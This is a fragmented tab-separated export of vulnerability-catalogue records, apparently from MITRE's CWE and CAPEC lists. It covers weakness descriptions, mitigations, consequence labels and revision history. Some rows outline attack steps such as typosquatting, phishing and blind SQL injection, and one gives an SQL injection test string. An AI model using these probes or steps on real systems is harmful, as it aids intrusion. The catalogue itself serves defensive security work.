23239	27	The adversary requires a variety of tools to collect information about the target. These include port/network scanners and tools to analyze responses from applications to determine version and configuration information. Footprinting a system adequately may also take a few days if the attacker wishes the footprinting attempt to go undetected.
5770	43	Simple
13028	74	1
16062	42	Only use reentrant functions within signal handlers. Also, use sanity checks to ensure that state is consistent while performing asynchronous actions that affect the state of execution.
8375	62	updated Relationships
19115	59	Updated Attack_Phases, References
10087	77	Dynamic Analysis with Manual Results Interpretation
17388	23	A static code block creates an instance of a class.
14244	39	2009-10-29
14511	28	CWE Content Team
24816	39	2014-07-30
13997	103	Primary
17697	104	612
6585	28	CWE Content Team
23204	35	MITRE
6093	88	Incomplete Internal State Distinction
7483	56	CanPrecede
22096	35	MITRE
22060	63	DoS: Crash, Exit, or Restart
6721	62	updated Demonstrative_Examples, Detection_Factors, Relationships
22382	33	J. Viega
10421	31	699
16196	102	ChildOf
9004	39	2011-06-01
18210	90	Perl
9728	31	699
23834	62	updated Time_of_Introduction
20026	56	ChildOf
9083	39	2017-01-19
15308	39	2011-09-13
12725	28	CWE Content Team
8254	31	1000
15531	46	Command injection vulnerabilities typically occur when:                             1. Data enters the application from an untrusted source.                2. The data is part of a string that is executed as a command by the application.                3. By executing the command, the application gives an attacker a privilege or capability that the attacker would not otherwise have.                          Command injection is a common problem with wrapper programs.
22952	35	MITRE
12333	62	updated Relationships, Taxonomy_Mappings
23646	31	1000
17455	35	MITRE
6159	26	Implementation
25435	26	Operation
22458	39	2009-03-10
18624	39	2009-12-28
18990	62	updated Relationships, Taxonomy_Mappings
19862	101	CAPEC Content Team
16509	62	updated Time_of_Introduction
23947	35	MITRE
15077	55	CAPEC Content Team
23846	62	updated Affected_Resources, Applicable_Platforms, Modes_of_Introduction, References, Relationships, Taxonomy_Mappings
11885	35	MITRE
7722	42	For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.
24513	51	2015-11-09
16369	81	Availability
12390	55	CAPEC Content Team
5825	62	updated Relationships
23465	23	Assigning public data to a private array is equivalent to giving public access to the array.
21267	39	2012-10-30
21894	91	Architecture and Design
16961	42	Protect critical cookies from replay attacks, since cross-site scripting or other attacks may allow attackers to steal a strongly-encrypted cookie that also passes integrity checks. This mitigation applies to cookies that should only be valid during a single transaction or session. By enforcing timeouts, you may limit the scope of an attack. As part of your integrity check, use an unpredictable, server-side value that is not exposed to the client.
24087	31	1000
18543	45	Base
22095	40	The adversary must have control of a router that can modify, drop, or introduce spoofed BGP updates.The adversary can convince
25244	71	2010
14532	95	[Determine target website] The adversary first determines which website to impersonate, generally one that is trusted and receives a consistent amount of traffic.
6006	39	2008-07-01
18837	86	http://msdn.microsoft.com/en-us/library/cc645032.aspx
15662	72	Executing untrusted code could compromise the control flow of the program. The untrusted code could execute attacker-controlled commands, read or modify sensitive resources, or prevent the software from functioning correctly for legitimate users.
10817	35	MITRE
11751	35	MITRE
17426	39	2019-06-20
22109	35	MITRE
23513	55	CAPEC Content Team
17093	91	Architecture and Design
12619	56	ChildOf
6538	56	ChildOf
20147	39	2019-01-03
11257	28	CWE Content Team
25429	62	updated Likelihood_of_Exploit, References, Taxonomy_Mappings
13274	59	Updated Attack_Motivation-Consequences
16672	28	CWE Content Team
18529	31	699
19583	66	Some Bad News and Some Good News
9246	39	2011-06-01
20773	47	Gain Privileges
13161	63	Read Application Data
12545	95	The attacker probes for programs running with elevated privileges.
7098	81	Access Control
16411	28	CWE Content Team
7555	28	CWE Content Team
19445	28	CWE Content Team
7679	31	699
21594	56	ChildOf
20515	28	CWE Content Team
20290	63	Read Files or Directories
20037	35	MITRE
22057	23	An adversary uses path manipulation methods to exploit insufficient input validation of a target to obtain access to data that should be not be retrievable by ordinary well-formed requests. A typical variety of this attack involves specifying a path to a desired file together with dot-dot-slash characters, resulting in the file access API or function traversing out of the intended directory structure and into the root file system. By replacing or modifying the expected path information the access function or API retrieves the file desired by the attacker. These attacks either involve the attacker providing a complete path to a targeted file or using control characters (e.g. path separators (/ or \) and/or dots (.)) to reach desired directories or files.
17171	62	updated Relationships
13345	96	2010-09-22
12120	50	If you have to use dangerous functions, make sure that you do boundary checking.
18507	40	Ability of adversary to inject custom strings in HTTP header
12109	28	CWE Content Team
22700	28	Eric Dalci
14167	28	CWE Content Team
24310	28	CWE Content Team
11247	62	updated Potential_Mitigations, References, Relationships, Taxonomy_Mappings
15728	28	CWE Content Team
20081	67	Low
13318	101	CAPEC Content Team
18456	47	Read Data
23671	39	2010-06-21
12709	91	Implementation
8221	104	1021
9303	91	Implementation
25290	23	The software stores a password in a configuration file that might be accessible to actors who do not know the password.
12949	28	CWE Content Team
13487	35	MITRE
11100	28	Eric Dalci
13831	63	DoS: Resource Consumption (Memory)
13445	90	Language-Independent
10302	100	The MITRE Corporation
12551	23	The software attempts to access a file based on the filename, but it does not properly prevent that filename from identifying a link or shortcut that resolves to an unintended resource.
21246	56	PeerOf
18439	42	Run or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code.                   Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64].
14366	62	updated Relationships
12890	31	1000
9424	28	CWE Content Team
17003	81	Access Control
6178	42	While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).
6925	62	updated Relationships
20582	35	MITRE
7233	62	updated Relationships, Taxonomy_Mappings
15507	35	KDM Analytics
15399	99	SANS Software Security Institute
10435	92	Exploit
13823	31	1000
21363	46	This occurs when a particular input is critical enough to the functioning of the application that it should not be modifiable at all, but it is. Certain resources are often assumed to be immutable when they are not, such as hidden form fields in web applications, cookies, and reverse DNS lookups.
25278	69	Incomplete
9487	28	CWE Content Team
23522	62	updated Time_of_Introduction
15029	28	CWE Content Team
15510	95	The target program consumes the data modified by the attacker without prior boundary checking. As a consequence, a buffer overflow occurs and at worst remote code execution may follow.
12526	101	CAPEC Content Team
6955	39	2014-07-30
9610	26	Implementation
22814	39	2008-07-01
21324	63	Varies by Context
9813	31	699
18703	39	2008-09-08
14997	92	Explore
11645	85	83
19703	63	Read Application Data
7271	28	CWE Content Team
18525	63	Bypass Protection Mechanism
13147	39	2008-07-01
23289	31	699
22825	35	MITRE
15469	81	Availability
6118	79	Integrity
16483	26	Architecture and Design
16797	57	Indirect
15410	91	Implementation
25152	28	CWE Content Team
11009	26	Implementation
23911	81	Other
12318	28	CWE Content Team
11640	63	Unexpected State
10784	59	Updated Related_Attack_Patterns, Resources_Required
24479	96	2018-07-02
21165	39	2010-12-13
21159	56	ChildOf
19682	101	CAPEC Content Team
21228	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
11568	91	Implementation
23315	56	ChildOf
22986	28	CWE Content Team
21791	28	CWE Content Team
9066	63	Read Application Data
20190	35	Cigital
10567	39	2008-07-01
17907	63	DoS: Amplification
22932	28	CWE Content Team
8910	39	2008-09-08
19796	103	Primary
13454	28	CWE Content Team
7708	39	2009-10-29
24751	28	CWE Content Team
8496	56	ChildOf
6810	39	2008-09-08
9763	35	MITRE
21221	73	Modify tokens logically
22691	60	19
24012	48	01
9537	103	Primary
23215	86	http://www.suspekt.org/downloads/POC2009-ShockingNewsInPHPExploitation.pdf
17245	56	ChildOf
15311	63	Modify Files or Directories
23640	72	Attackers can leverage the additional information provided by a default error page to mount attacks targeted on the framework, database, or other resources used by the application.
13134	23	An adversary engages in activity to detect the operating system or firmware version of a remote target by interrogating a device, server, or platform with a probe designed to solicit behavior that will reveal information about the operating systems or firmware in the environment. Operating System detection is possible because implementations of common protocols (Such as IP or TCP) differ in distinct ways. While the implementation differences are not sufficient to 'break' compatibility with the protocol the differences are detectable because the target will respond in unique ways to specific probing activity that breaks the semantic or logical rules of packet construction for a protocol. Different operating systems will have a unique response to the anomalous input, providing the basis to fingerprint the OS behavior. This type of OS fingerprinting can distinguish between operating system types and versions.
23124	63	Modify Application Data
5864	28	CWE Content Team
8693	28	CWE Content Team
6504	35	Cigital
6699	77	Manual Static Analysis - Source Code
25109	39	2011-09-13
10391	28	CWE Content Team
22780	63	Other
15224	69	Draft
7810	39	2011-06-01
24936	103	Primary
14916	39	2008-10-14
21491	56	Requires
22962	46	While often just a bug, operator precedence logic errors can have serious consequences if they are used in security-critical code, such as making an authentication decision.
16292	63	Execute Unauthorized Code or Commands
19910	39	2010-06-21
5643	28	CWE Content Team
21925	45	Compound
21677	92	Experiment
6471	54	Medium
14436	103	Primary
12278	35	MITRE
23375	46	Many operating systems allow a user to list information about processes that are owned by other users. This information could include command line arguments or environment variable settings. When this data contains sensitive information such as credentials, it might allow other users to launch an attack against the software or related resources.
11585	62	updated Common_Consequences
9417	88	Missing Synchronization
9391	81	Confidentiality
10021	62	updated Common_Consequences
7380	39	2019-06-20
14370	35	MITRE
21708	102	ChildOf
24033	95	[Discovery of potential injection vectors] Using an automated tool or manual discovery, the attacker identifies services or methods with arguments that could potentially be used as injection vectors (OS, API, SQL procedures, etc.).
11688	23	An application typically makes calls to functions that are a part of libraries external to the application. These libraries may be part of the operating system or they may be third party libraries. It is possible that the application does not handle situations properly where access to these libraries has been blocked. Depending on the error handling within the application, blocked access to libraries may leave the system in an insecure state that could be leveraged by an attacker.
18949	85	209
9448	81	Availability
10087	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Fuzz Tester                            Framework-based Fuzzer                                                                     Cost effective for partial coverage:                                                                           Forced Path Execution
14420	28	CWE Content Team
20008	35	MITRE
20705	47	Resource Consumption
11065	62	updated Relationships
9030	25	Low
20989	47	Hide Activities
19711	100	The MITRE Corporation
6896	62	updated Related_Attack_Patterns, Relationships
20858	26	Architecture and Design
14611	27	The attacker must have access to the client for the targeted service (this step is trivial for most web-based services). The attacker must also be able to reverse engineer the client in order to locate and modify the client's purse logic. Reverse engineering tools would be necessary for this.
18866	72	The security mechanism can be bypassed easily.
20845	45	Base
19068	62	updated Demonstrative_Examples
15155	67	High
11878	42	To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.
9842	23	The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as parameter or argument delimiters when they are sent to a downstream component.
15451	63	Execute Unauthorized Code or Commands
22492	91	Implementation
24372	26	Architecture and Design
8458	88	Public cloneable() Method Without Final ('Object Hijack')
8739	78	Medium
8697	35	MITRE
16448	28	CWE Content Team
7531	75	Without visibility into the code, black box methods may not be able to sufficiently distinguish this weakness from others, requiring follow-up manual methods to diagnose the underlying problem.
23925	62	updated Relationships
17325	39	2008-10-14
12541	91	Architecture and Design
23844	28	CWE Content Team
9076	103	Primary
18112	39	2012-10-30
8691	79	Confidentiality
18730	38	Repeated submissions of incorrect secret values may indicate a brute force attack. For example, repeated bad passwords when accessing user accounts or repeated queries to databases using non-existent keys.
9468	62	updated References, Relationships
10914	81	Other
24104	62	updated Relationships
18218	104	764
18584	62	updated Potential_Mitigations, References
9974	73	Use a browser to manually explore the website and analyze how the application processes XML requests.
7900	39	2017-11-08
11579	89	Detailed
16649	31	1000
6419	40	JSON is used as a transport mechanism between the client and the server
16440	35	MITRE
24051	31	1000
18412	28	CWE Content Team
21207	59	Updated References
9512	81	Confidentiality
21465	80	Deploying a malicious "look-a-like" site (such as a site masquerading as a bank or online auction site) that the user enters their authentication data into.
18426	79	Integrity
17372	62	updated Common_Consequences
13966	31	1000
19606	28	CWE Content Team
13107	23	An adversary conducts supply chain attacks by the inclusion of insecure 3rd party components into a technology, product, or code-base, possibly packaging a malicious driver or component along with the product before shipping it to the consumer or acquirer. The result is a window of opportunity for exploiting the product or software until the insecure component is discovered. This supply chain threat can result in the installation of software that introduces widespread security vulnerabilities within an organization. One example could be the inclusion of an exploitable DLL (Dynamic Link Library) included within an antivirus technology. Because software often depends upon a large number of interdependent libraries and components to be present, security holes can be introduced merely by installing COTS software that comes pre-packaged with the components required for it to operate.
23825	28	CWE Content Team
16986	35	MITRE
19442	53	The MITRE Corporation
12305	42	Try to store sensitive tempfiles in a directory which is not world readable -- i.e., per-user directories.
7321	35	MITRE
6030	23	The software uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '...' (triple dot) sequences that can resolve to a location that is outside of that directory.
15178	35	MITRE
22703	28	CWE Content Team
19962	39	2008-07-01
20842	23	This attack targets predictable session ID in order to gain privileges. The attacker can predict the session ID used during a transaction to perform spoofing and session hijacking.
6911	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit
22299	28	CWE Content Team
12223	74	2
15429	91	Implementation
9912	28	Eric Dalci
24421	39	2011-09-13
21735	85	163
8145	90	C++
9674	62	updated Demonstrative_Examples
15588	42	Make appropriate use of cryptography to protect the credentials.
20770	28	CWE Content Team
13313	89	Standard
14387	90	C++
14871	104	531
11042	62	updated Related_Attack_Patterns
20808	55	CAPEC Content Team
15655	62	updated Name
12108	63	Execute Unauthorized Code or Commands
24282	39	2012-05-11
8272	36	http://www.faqs.org/rfcs/rfc768.html
11065	39	2010-02-16
12206	23	An adversary manipulates a setting or parameter on communications channel in order to compromise its security. This can result in information exposure, insertion/removal of information from the communications stream, and/or potentially system compromise.
10570	35	Cigital
8623	102	ChildOf
21868	56	ChildOf
9488	59	Updated Related_Weaknesses
9329	33	Blaise Doughan
8582	30	Robert Auger
10244	100	The MITRE Corporation
15246	39	2009-05-27
22375	28	CWE Content Team
15998	95	Determine the configuration levels of either the server or client being targeted, preferably both. This is not a hard requirement, as the attacker can simply assume commonly exploitable configuration settings and blindly attempt them.
16580	76	2019-09-30
12128	103	Primary
21253	61	Draft
20894	103	Primary
8316	95	Determine if the source code is available and if so, examine the filter logic.
20515	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
13431	39	2008-07-01
18891	39	2011-03-29
8562	45	Base
10644	63	Varies by Context
8451	40	The adversary must have the ability to communicate with the server.
9835	35	MITRE
19298	28	CWE Content Team
12945	89	Standard
6269	62	updated Applicable_Platforms, Description, Relationships
17363	31	1003
12569	28	CWE Content Team
24972	100	The MITRE Corporation
12593	42	Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   For example, Ada allows the programmer to constrain the values of a variable and languages such as Java and Ruby will allow the programmer to handle exceptions when an out-of-bounds index is accessed.
17639	104	549
11653	99	The Verge
10566	59	Updated Description, Related_Attack_Patterns
23391	28	CWE Content Team
24786	39	2012-10-30
12893	35	MITRE
12145	97	Web Logs Tampering
7937	35	MITRE
9054	51	2014-06-23
10954	73	Place phishing link in post to online forum.
11137	76	2015-12-07
19269	97	Session Credential Falsification through Forging
22154	47	Gain Privileges
17387	79	Access Control
7232	24	MITRE
22927	35	MITRE
16090	66	Address Space Layout Randomization in Windows Vista
7039	21	PLOVER
17094	72	An attacker may be able to cause a denial of service.
15394	31	1000
6785	43	Simple
5682	51	2014-06-23
19692	27	This attack can be carried out with a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.
6296	47	Execute Unauthorized Commands
16252	62	updated Demonstrative_Examples
22671	35	MITRE
20950	56	ChildOf
15697	79	Confidentiality
17712	79	Confidentiality
23012	35	MITRE
14935	30	Stefano di Paola
11478	28	CWE Content Team
16466	53	The MITRE Corporation
18339	88	Missing Authentication for Critical Function
8801	101	CAPEC Content Team
19848	62	updated Relationships
11074	79	Confidentiality
12208	62	updated Affected_Resources, Applicable_Platforms, Functional_Areas, Relationships
21746	28	CWE Content Team
9500	35	MITRE
13473	90	Language-Independent
13395	31	1000
6674	35	Cigital
9369	39	2009-10-29
18049	28	CWE Content Team
9260	42	Ensure that the checksums present in the protocol design are properly implemented and added to each message before it is sent.
20204	25	Low
8083	27	The adversary must have the ability to modify hidden fields by editing the HTTP response to the server.
5698	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
7996	35	MITRE
14729	28	CWE Content Team
6405	40	The target environment must consist of a web-mail server that the attacker can query and a back-end mail server. The back-end mail server need not be directly accessible to the attacker.
15797	47	Gain Privileges
13339	76	2019-04-04
22181	31	1000
7988	62	updated Relationships
18461	92	Experiment
6876	23	Blind SQL Injection results from an insufficient mitigation for SQL Injection. Although suppressing database error messages are considered best practice, the suppression alone is not sufficient to prevent SQL Injection. Blind SQL Injection is a form of SQL Injection that overcomes the lack of error messages. Without the error messages that facilitate SQL Injection, the adversary constructs input strings that probe the target through simple Boolean SQL expressions. The adversary can determine if the syntax and structure of the injection was successful based on whether the query was executed or not. Applied iteratively, the adversary determines how and where the target is vulnerable to SQL Injection.
13775	62	updated Potential_Mitigations, Related_Attack_Patterns, Relationships
16814	63	Execute Unauthorized Code or Commands
13199	39	2012-05-11
5671	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
20245	51	2014-06-23
10562	81	Integrity
19417	62	updated Related_Attack_Patterns, Relationships
19980	21	Anonymous Tool Vendor (under NDA)
23778	89	Detailed
7902	56	ChildOf
10476	30	Frank Piessens
5861	23	An adversary passively sniffs network communications and captures application code bound for an authorized client. Once obtained, they can use it as-is, or through reverse-engineering glean sensitive information or exploit the trust relationship between the client and server. Such code may belong to a dynamic update to the client, a patch being applied to a client component or any such interaction where the client is authorized to communicate with the server.
10066	31	699
24864	39	2010-09-27
6834	28	CWE Content Team
12846	35	MITRE
24587	95	[Survey] The attacker surveys the target application, possibly as a valid and authenticated user.
14365	61	Draft
8568	73	Try injecting a string containing char(0x31)=char(0x31) (this evaluates to 1=1 in SQL Server only)
20763	28	CWE Content Team
8089	102	CanFollow
10228	88	Cross-Site Request Forgery (CSRF)
9246	62	updated Common_Consequences
21461	31	1000
19796	56	ChildOf
15519	95	[Verify the exploitable security weaknesses] The attacker tries to craft malicious signed code from another language allowed by the sandbox to verify the security weaknesses of the standard libraries found in the Explore phase.
23946	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
24552	26	Implementation
24735	88	Missing Initialization of Resource
18634	62	updated Relationships
25111	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
6788	66	SafeInt
5744	102	ChildOf
13762	35	MITRE
7136	39	2008-10-14
10562	72	Other applications, possibly untrusted, can read or modify the data that is offered by the Content Provider.
14150	91	Architecture and Design
23944	47	Gain Privileges
17951	62	updated Related_Attack_Patterns
21063	91	Testing
13449	92	Experiment
17698	28	CWE Content Team
18259	62	updated Time_of_Introduction
23228	39	2017-11-08
15578	42	If they do not need to be shared by other applications, explicitly mark components with android:exported="false" in the application manifest.
19771	62	updated Description, Name
10795	90	C
7489	39	2008-10-14
13587	95	[Gather information so attack can be performed independently.] If possible, gather the necessary information so a successful search can be determined without consultation of an external authority. This can be accomplished by capturing cryptotext (if the goal is decoding the text) or the encrypted password dictionary (if the goal is learning passwords).
16424	28	CWE Content Team
8897	26	Architecture and Design
6675	62	updated Relationships, Taxonomy_Mappings
6489	76	2017-08-04
18499	63	Modify Files or Directories
7989	95	Once the "winning" alternate encoding using (typically leading) ghost characters is identified, an adversary can launch the attacks against the targeted API (e.g. directory traversal attack, arbitrary shell command execution, corruption of files)
9018	26	Implementation
18339	90	Language-Independent
7912	39	2017-11-08
22063	39	2017-11-08
23301	21	Anonymous Tool Vendor (under NDA)
18830	55	CAPEC Content Team
9176	91	Implementation
13497	27	The attacker usually needs to be able to invoke micro-services directly in order to control the parameters that are used in their attack. The attacker may require other resources depending on the nature of the flaw in the targeted micro-service.
18442	61	Draft
20920	103	Primary
20629	74	1
18393	77	White Box
11182	50	Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input.
24209	55	CAPEC Content Team
24825	35	Cigital
25401	62	updated Common_Consequences
9028	31	1000
19389	53	The MITRE Corporation
6635	89	Detailed
8042	39	2015-12-07
19232	35	MITRE
10360	35	MITRE
17501	76	2018-07-31
12117	28	CWE Content Team
23741	36	https://www.owasp.org/index.php/Path_Traversal
22131	28	CWE Content Team
14618	104	1042
15759	31	1000
19906	63	Other
17085	31	1000
15321	28	CWE Content Team
7758	39	2008-08-15
16764	78	Low
15179	76	2015-12-07
16766	23	The use of single-factor authentication can lead to unnecessary risk of compromise when compared with the benefits of a dual-factor authentication scheme.
7719	80	Medium level of cryptography knowledge, specifically how iterative hash functions work. This is needed to select proper padding.
6818	25	Low
11186	28	CWE Content Team
16635	28	CWE Content Team
13690	104	1093
21644	53	The MITRE Corporation
21554	39	2014-07-30
23112	62	updated Taxonomy_Mappings
7245	39	2011-06-01
19296	39	2012-10-30
14344	34	This weakness can occur in code paths that are not well-tested, such as rare error conditions. This is because the use of uninitialized data would be noticed as a bug during frequently-used functionality.
18160	72	Run arbitrary code.
25242	74	1
9139	39	2017-11-08
11559	91	Architecture and Design
14735	39	2011-06-01
14822	28	CWE Content Team
19534	39	2012-05-11
12750	39	2017-11-08
12644	28	CWE Content Team
9526	35	MITRE
20550	39	2013-07-17
14391	39	2013-02-21
24712	35	MITRE
12815	96	2013-07-09
24218	22	05
7517	101	CAPEC Content Team
13214	103	Primary
18395	103	Primary
22171	62	updated Relationships, Taxonomy_Mappings
24153	28	CWE Content Team
18167	60	04
8083	85	162
15576	62	updated Description, Relationships
13168	21	7 Pernicious Kingdoms
17975	55	CAPEC Content Team
10298	28	CWE Content Team
8822	35	MITRE
12710	28	CWE Content Team
10042	69	Draft
24804	43	Simple
8114	39	2014-07-30
20949	28	CWE Content Team
22507	35	MITRE
19431	31	1000
16544	73	The attacker attempts unauthenticated access to targeted functions and data.
11018	43	Simple
20548	88	Race Condition During Access to Alternate Channel
14367	62	updated Applicable_Platforms, Likelihood_of_Exploit, Modes_of_Introduction, Relationships
18799	47	Gain Privileges
9794	81	Integrity
9277	35	MITRE
10202	35	MITRE
16854	62	updated Related_Attack_Patterns, Relationships
8839	25	Medium
17572	62	updated Description
17716	35	MITRE
7761	45	Class
17235	39	2008-07-01
23705	62	updated Applicable_Platforms, Taxonomy_Mappings
10076	39	2011-06-01
11579	50	Implementation: Perform input validation for all remote content, including remote and user-generated content.
18315	62	updated Alternate_Terms, Demonstrative_Examples, Description, Modes_of_Introduction, Name, Potential_Mitigations, References
18196	62	updated Relationships
20812	39	2008-09-08
16319	35	MITRE
20637	62	updated Relationships, Relationship_Notes, Taxonomy_Mappings
16448	62	updated Relationships
16777	42	Identify the functionality that requires additional privileges, such as access to privileged operating system resources. Wrap and centralize this functionality if possible, and isolate the privileged code as much as possible from other code [REF-76]. Raise privileges as late as possible, and drop them as soon as possible to avoid CWE-271. Avoid weaknesses such as CWE-288 and CWE-420 by protecting all possible communication channels that could interact with the privileged code, such as a secondary socket that is only intended to be accessed by administrators.
21592	35	MITRE
23725	28	CWE Content Team
16107	35	Cigital
17732	23	A process does not close sensitive file descriptors before invoking a child process, which allows the child to perform unauthorized I/O operations using those descriptors.
13837	35	MITRE
6781	39	2017-01-19
8428	56	ChildOf
18955	104	524
22469	67	High
22998	42	Where possible, encrypt sensitive data that are used by a software system.
15897	39	2008-09-08
10778	62	updated Demonstrative_Examples, References, Relationships
8786	72	Actions, which may not be authorized otherwise, can be carried out as if they were validated by the server referred to.
5731	62	updated Potential_Mitigations
20609	43	Simple
22883	43	Simple
11876	59	Updated Alternate_Terms, Attack_Phases
6514	28	CWE Content Team
20674	31	1000
21376	39	2008-09-08
12296	50	Configuration: Configure web server software to limit the waiting period on opened HTTP sessions                Design: Use load balancing mechanisms
11138	35	MITRE
10547	39	2017-01-19
12468	35	KDM Analytics
19716	97	TCP FIN Scan
19753	44	High
22581	39	2012-10-30
16145	39	2017-11-08
22626	31	1000
10398	28	CWE Content Team
9603	35	MITRE
19757	28	CWE Content Team
6172	68	This is not a complete solution. However, it forces the attacker to guess an unknown value that changes every program execution. In addition, an attack could still cause a denial of service, since the typical response is to exit the application.
16736	42	Design signal handlers to only set flags, rather than perform complex functionality. These flags can then be checked and acted upon within the main program loop.
9499	62	updated Relationships
22011	101	CAPEC Content Team
6329	63	DoS: Resource Consumption (CPU)
22701	78	High
15818	35	MITRE
21262	81	Confidentiality
22588	57	Resultant
17821	53	The MITRE Corporation
8128	62	updated Common_Consequences
18364	42	Use a non-conflicting privilege scheme.
16918	63	Bypass Protection Mechanism
8570	62	updated Relationships, Other_Notes, Taxonomy_Mappings
5921	72	Unchecked input leads to cross-site scripting, process control, and SQL injection vulnerabilities, among others.
22633	39	2012-10-30
15247	28	CWE Content Team
25258	103	Primary
18626	62	updated Description, Relationships
17765	26	Implementation
15004	28	CWE Content Team
6142	56	ChildOf
17137	31	1000
9724	56	ChildOf
19289	42	Make sure that all input supplied by the user to the password recovery mechanism is thoroughly filtered and validated.
22286	61	Draft
12780	39	2008-09-08
17537	35	MITRE
7667	28	CWE Content Team
23710	35	MITRE
8274	81	Confidentiality
21456	42	Developers should anticipate that multiple trailing special elements will be injected/removed/manipulated in the input vectors of their software system. Use an appropriate combination of black lists and whitelists to ensure only valid, expected and appropriate input is processed by the system.
16928	39	2010-06-21
8727	31	1000
22821	22	02
7057	95	[Deceive user into visiting domain] Finally, the adversary needs to deceive a user into visiting the TypoSquatted domain.
23468	28	CWE Content Team
18902	91	Architecture and Design
17877	90	C++
9533	103	Primary
18073	56	ChildOf
6339	62	added/updated demonstrative examples
16837	56	ChildOf
21238	50	Configuration: Properly configure the crossdomain.xml file to only include the known domains that should host remote flash movies.
13313	78	High
24263	21	CWE Content Team
24414	72	Execution of arbitrary code in the context of usage of the resources with dangerous names.
24979	35	MITRE
10253	63	DoS: Instability
21973	62	updated Related_Attack_Patterns, Relationships
8621	35	MITRE
19969	28	CWE Content Team
9432	35	MITRE
9746	28	CWE Content Team
7895	28	CWE Content Team
10460	35	MITRE
8648	31	1000
12820	91	Implementation
23441	79	Confidentiality
11898	35	MITRE
23097	61	Draft
19075	39	2019-01-03
5885	86	http://freshbrewedcode.com/joshbush/2012/03/05/mass-assignment-aspnet-mvc/
21181	23	This attack targets the use of the backslash in alternate encoding. An attacker can provide a backslash as a leading character and causes a parser to believe that the next character is special. This is called an escape. By using that trick, the attacker tries to exploit alternate ways to encode the same character which leads to filter problems and opens avenues to attack.
7022	28	CWE Content Team
10639	28	CWE Content Team
14623	56	ChildOf
17096	40	User controllable input used as part of commands to the underlying operating system.
7215	59	Updated Related_Attack_Patterns
14618	23	The code contains a member element that is declared as static (but not final), in which      its parent class element       is not a singleton class - that is, a class element that can be used only once in      the 'to' association of a Create action.
8756	39	2011-06-27
19427	39	2012-10-30
7969	31	699
19281	35	MITRE
10311	28	CWE Content Team
18509	33	Ivan Ristic
6822	62	updated References
18882	77	Dynamic Analysis with Manual Results Interpretation
14893	104	917
7522	56	ChildOf
9238	88	Allocation of Resources Without Limits or Throttling
6251	28	CWE Content Team
25116	39	2012-05-11
10194	56	ChildOf
6336	35	MITRE
18329	59	Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit
15205	39	2012-10-30
15042	40	Target server software must be a HTTP daemon that relies on cookies.
17899	59	Updated Attacker_Skills_or_Knowledge_Required, Description, Description Summary, References
18124	61	Draft
18307	42	Avoid making decisions based on names of resources (e.g. files) if those resources can have alternate names.
24951	39	2009-03-10
8453	28	CWE Content Team
6283	56	ChildOf
18033	76	2017-08-04
23124	81	Other
22195	104	690
7310	47	Other
12740	62	updated Demonstrative_Examples, Description, Name, Related_Attack_Patterns
24845	26	Architecture and Design
17905	28	CWE Content Team
16627	39	2012-05-11
14050	62	updated Relationships, Taxonomy_Mappings
10615	72	This weakness can allow an attacker to access resources which are not otherwise accessible without proper authentication.
20177	40	The vulnerable environment variable uses untrusted data.
9514	62	updated Common_Consequences
18077	28	CWE Content Team
23012	39	2009-05-27
6330	91	Operation
22854	62	updated Applicable_Platforms, References
21431	79	Confidentiality
8842	62	updated References, Relationships
24145	88	Improper Check for Dropped Privileges
12567	50	Implementation: Reject HTTP request with a malicious Host header.
12544	62	updated Related_Attack_Patterns
14474	56	ChildOf
23558	28	CWE Content Team
9871	28	CWE Content Team
13354	35	MITRE
14851	81	Integrity
18442	85	559
21367	62	updated Description, Relationships
11815	39	2011-06-01
21169	35	MITRE
6153	53	The MITRE Corporation
15876	28	CWE Content Team
8246	39	2019-06-20
10088	28	Sean Eidemiller
9709	48	09
16501	62	updated Detection_Factors
12825	95	Set up a sniffer                   The attacker sets up a sniffer in the path between the server and the client and watches the traffic.
13847	28	CWE Content Team
14019	39	2008-08-15
12668	57	Resultant
21162	35	MITRE
6296	79	Confidentiality
17702	23	The software performs multiple related behaviors, but the behaviors are performed in the wrong order in ways which may produce resultant weaknesses.
17356	90	Language-Independent
21669	103	Primary
18793	78	Medium
13773	62	updated Applicable_Platforms, References
23120	35	Cigital
24588	88	J2EE Misconfiguration: Weak Access Permissions for EJB Methods
11092	91	Implementation
6806	91	Architecture and Design
20148	39	2014-06-23
11575	31	699
17961	62	updated References, Relationships, Taxonomy_Mappings
11681	26	Requirements
